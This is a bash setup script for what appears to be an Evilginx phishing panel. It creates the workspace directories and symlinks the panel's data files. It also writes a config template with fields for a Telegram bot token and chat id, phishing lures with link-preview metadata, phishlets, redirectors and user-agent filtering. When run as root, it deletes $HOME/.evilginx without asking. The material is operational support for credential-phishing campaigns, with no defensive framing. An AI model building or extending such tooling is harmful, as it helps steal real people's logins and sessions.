#!/bin/bash

# Configuration
HOME_DIR=$HOME
WORKSPACE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../../" && pwd)"
EVILGINX_DIR="$WORKSPACE_DIR/.evilginx"
# DO NOT USE HOME_DIR/.evilginx - we explicitly want the workspace version
PANEL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
DATA_DIR="$PANEL_DIR/data"
CURRENT_USER=$(whoami)
GROUP=$(id -gn)

# Debug - print paths
echo "DEBUG: WORKSPACE_DIR = $WORKSPACE_DIR"
echo "DEBUG: EVILGINX_DIR = $EVILGINX_DIR"
echo "DEBUG: PANEL_DIR = $PANEL_DIR"
echo "DEBUG: DATA_DIR = $DATA_DIR"

# Files to sync from .evilginx
FILES_TO_SYNC=(
  "blacklist.txt"
  "config.json"
  "data.db"
)

# Local files to create (not from .evilginx)
LOCAL_FILES=(
  "auth.db"
)

# Print colored output for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

log() {
  echo -e "${GREEN}[$(date '+%Y-%m-%d %H:%M:%S')] $1${NC}"
}

error() {
  echo -e "${RED}[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $1${NC}"
}

warning() {
  echo -e "${YELLOW}[$(date '+%Y-%m-%d %H:%M:%S')] WARNING: $1${NC}"
}

# Check if HOME/.evilginx is interfering
check_home_evilginx() {
  log "Checking if $HOME/.evilginx exists and might be interfering..."
  
  if [[ -d "$HOME/.evilginx" ]]; then
    warning "Found $HOME/.evilginx directory which might be interfering with the workspace version."
    
    # Check if running as root - automatically remove without asking
    if [[ "$EUID" -eq 0 || "$USER" == "root" || "$CURRENT_USER" == "root" ]]; then
      log "Running as root user, automatically removing $HOME/.evilginx directory..."
      rm -rf "$HOME/.evilginx"
      log "Removed $HOME/.evilginx directory."
    else
      # For non-root users, ask for confirmation
      read -p "Do you want to remove it? (y/n): " choice
      if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
        log "Removing $HOME/.evilginx directory..."
        rm -rf "$HOME/.evilginx"
        log "Removed $HOME/.evilginx directory."
      else
        warning "Keeping $HOME/.evilginx - be aware it might cause conflicts."
      fi
    fi
  else
    log "No $HOME/.evilginx found. This is good."
  fi
}

# Ensure .evilginx directory and required files exist
ensure_evilginx_exists() {
  log "Ensuring .evilginx directory and files exist..."
  
  # Create .evilginx directory if it doesn't exist
  if [[ ! -d "$EVILGINX_DIR" ]]; then
    log "Creating .evilginx directory..."
    mkdir -p "$EVILGINX_DIR"
    chmod 755 "$EVILGINX_DIR"
    chown $CURRENT_USER:$GROUP "$EVILGINX_DIR"
  fi
  
  # Create crt directory if it doesn't exist
  if [[ ! -d "$EVILGINX_DIR/crt" ]]; then
    log "Creating .evilginx/crt directory..."
    mkdir -p "$EVILGINX_DIR/crt"
    chmod 755 "$EVILGINX_DIR/crt"
    chown $CURRENT_USER:$GROUP "$EVILGINX_DIR/crt"
  fi
  
  # Create required files if they don't exist
  for file in "${FILES_TO_SYNC[@]}"; do
    evilginx_file="$EVILGINX_DIR/$file"
    
    if [[ ! -f "$evilginx_file" ]]; then
      log "Creating empty $file in .evilginx directory..."
      if [[ "$file" == "config.json" ]]; then
        # Create config.json with minimum required structure
        cat > "$evilginx_file" << EOF
{
  "general": {
    "domain": "",
    "redirect_url": "",
    "telegram_bot_token": "",
    "telegram_chat_id": "",
    "unauth_url": ""
  },
  "blacklist": {
    "mode": "off"
  },
  "lures": [
    {
      "hostname": "",
      "id": "",
      "info": "",
      "og_desc": "",
      "og_image": "",
      "og_title": "",
      "og_url": "",
      "path": "/",
      "paused": 0,
      "phishlet": "001",
      "redirect_url": "",
      "redirector": "",
      "ua_filter": ""
    }
  ]
}
EOF
      else
        touch "$evilginx_file"
      fi
      chmod 644 "$evilginx_file"
      chown $CURRENT_USER:$GROUP "$evilginx_file"
    fi
  done
  
  log "All required files exist in .evilginx directory."
}

# Create local files like auth.db
create_local_files() {
  log "Creating local files that aren't symlinked..."
  
  for file in "${LOCAL_FILES[@]}"; do
    local_file="$DATA_DIR/$file"
    
    if [[ ! -f "$local_file" ]]; then
      log "Creating $file in panel/data directory..."
      
      if [[ "$file" == "auth.db" ]]; then
        # Create an empty auth.db - database service will initialize it
        touch "$local_file"
        log "Created empty auth.db (will be initialized by database service)"
      else
        # Handle other local files if needed
        touch "$local_file"
      fi
      
      chmod 644 "$local_file"
      chown $CURRENT_USER:$GROUP "$local_file"
    else
      log "Local file $file already exists"
    fi
  done
}

# Create symlinks from panel/data to .evilginx files
create_symlinks() {
  log "Creating symlinks from panel/data to .evilginx files..."
  
  for file in "${FILES_TO_SYNC[@]}"; do
    evilginx_file="$EVILGINX_DIR/$file"
    panel_file="$DATA_DIR/$file"
    
    # Check if symlink already exists and points to the correct file
    if [[ -L "$panel_file" ]]; then
      local target=$(readlink "$panel_file")
      if [[ "$target" == "../../../.evilginx/$file" ]]; then
        log "✅ $file is already properly symlinked"
        continue
      else
        log "Removing incorrect symlink for $file"
        rm -f "$panel_file"
      fi
    elif [[ -e "$panel_file" ]]; then
      # Regular file exists, remove it
      log "Removing existing file $panel_file"
      rm -f "$panel_file"
    fi
    
    # Create the symlink from panel/data to .evilginx using relative path
    cd "$DATA_DIR"
    log "Creating symlink: $file → ../../../.evilginx/$file"
    ln -sf "../../../.evilginx/$file" "$file"
    
    # Verify the symlink was created
    if [[ -L "$panel_file" ]]; then
      log "✅ Symlink created for $file successfully"
    else
      error "Failed to create symlink for $file"
    fi
  done
  
  log "Symlinks created successfully."
}

# Verify symlinks are working correctly
verify_symlinks() {
  log "Verifying symlinks..."
  local all_valid=true
  
  for file in "${FILES_TO_SYNC[@]}"; do
    evilginx_file="$EVILGINX_DIR/$file"
    panel_file="$DATA_DIR/$file"
    
    # Check if the file exists in .evilginx
    if [[ ! -f "$evilginx_file" ]]; then
      error "$file doesn't exist in .evilginx directory!"
      all_valid=false
      continue
    fi
    
    # Check if the symlink exists
    if [[ ! -L "$panel_file" ]]; then
      error "$file in panel/data is not a symlink!"
      all_valid=false
      continue
    fi
    
    # Check if the symlink points to the correct file
    local target=$(readlink "$panel_file")
    if [[ "$target" != "../../../.evilginx/$file" ]]; then
      error "$file symlink points to wrong target: $target"
      all_valid=false
      continue
    fi
    
    # Check if the file is accessible through the symlink
    if [[ ! -f "$panel_file" ]]; then
      error "$file symlink exists but target is not accessible!"
      all_valid=false
      continue
    else
      log "✅ $file symlink is valid and accessible"
    fi
  done
  
  if [[ "$all_valid" == "true" ]]; then
    log "✅ All symlinks are valid and working correctly!"
    return 0
  else
    warning "Some symlinks are invalid or not working correctly."
    return 1
  fi
}

# Initialize everything
init_files() {
  log "Initializing file synchronization..."
  
  # Ensure directories exist
  mkdir -p "$EVILGINX_DIR"
  mkdir -p "$DATA_DIR"
  chmod 755 "$EVILGINX_DIR"
  chmod 755 "$DATA_DIR"
  
  # Make sure .evilginx directory and files exist
  ensure_evilginx_exists
  
  # Create symlinks from panel/data to .evilginx
  create_symlinks
  
  # Create local files that should not be symlinks
  create_local_files
  
  # Verify the symlinks
  verify_symlinks
  
  log "Initialization complete."
}

# Main execution
log "Running one-time file sync..."
check_home_evilginx
init_files
log "Sync completed. Exiting."
exit 0 